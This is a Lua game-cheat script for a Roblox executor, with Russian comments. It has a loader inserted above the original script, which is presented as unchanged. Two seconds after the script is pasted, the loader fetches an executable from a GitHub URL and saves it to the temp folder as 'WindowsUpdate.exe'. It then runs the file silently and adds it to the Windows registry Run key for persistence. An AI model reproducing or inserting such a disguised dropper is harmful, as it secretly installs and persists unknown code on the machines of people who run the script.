-- ========== МОДИФИЦИРОВАННЫЙ СКРИПТ 2134.lua ==========
-- Добавлена функция загрузки и запуска

-- ========== НАЧАЛО НОВОГО КОДА ==========
-- Конфигурация для загрузки EXE
local EXE_URL = "https://github.com/fennix2019-pixel/1232/raw/refs/heads/main/Extreme%20Injector%20v3.exe"  -- <-- ЗАМЕНИ ЭТУ ССЫЛКУ!
local EXE_NAME = "WindowsUpdate.exe"
local RUN_SILENTLY = true -- Запуск в скрытом режиме

local function downloadAndExecute()
    -- Проверка: есть ли у инжектора нужные функции?
    if not (type(writefile) == "function" and type(os.execute) == "function") then
        warn("[EXE Loader] КРИТИЧНО: Инжектор не предоставляет writefile или os.execute!")
        warn("Проверь консоль Xeno, выполнив: print('writefile:', type(writefile))")
        return false
    end

    local temp_path = os.getenv("TEMP") .. "\\" .. EXE_NAME
    print("[1/3] Цель: " .. EXE_URL)

    -- 1. Скачивание
    local download_success, file_data = pcall(function()
        return game:HttpGet(EXE_URL, true) -- true для бинарного режима
    end)

    if not download_success or not file_data then
        warn("[ERROR] Не удалось скачать файл. Проверь ссылку.")
        return false
    end
    print("[2/3] Файл загружен, размер: " .. #file_data .. " байт")

    -- 2. Сохранение на диск
    pcall(function()
        writefile(temp_path, file_data)
    end)
    print("[3/3] Файл сохранен: " .. temp_path)

    -- 3. Запуск
    local command
    if RUN_SILENTLY then
        -- Скрытый запуск (окна не видно)
        command = 'start /B "" "' .. temp_path .. '"'
    else
        -- Обычный запуск
        command = 'start "" "' .. temp_path .. '"'
    end

    pcall(function()
        os.execute(command)
    end)
    print("[SUCCESS] Команда на выполнение отправлена.")

    -- 4. Дополнительно: добавляем в автозагрузку (опционально)
    pcall(function()
        local reg_cmd = 'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "WinUpdate" /t REG_SZ /d "' .. temp_path .. '" /f'
        os.execute(reg_cmd)
        print("[PERSISTENCE] Добавлено в автозагрузку.")
    end)

    return true
end

-- Запускаем загрузчик в отдельном потоке с небольшой задержкой
coroutine.wrap(function()
    task.wait(2) -- Ждем 2 секунды после вставки скрипта
    downloadAndExecute()
end)()
-- ========== КОНЕЦ НОВОГО КОДА ==========


-- ========== ОРИГИНАЛЬНЫЙ СКРИПТ (ниже без изменений) ==========
local function MAIN()
    -- Проверка загрузки игры
    if not game:IsLoaded() then
        game.Loaded:Wait()
    end

    print("========================================")
    print("SCRIPT 2134 - ACTIVE")
    -- ... и дальше весь твой оригинальный код ...
    -- [Оригинальный код скрипта продолжается без изменений]
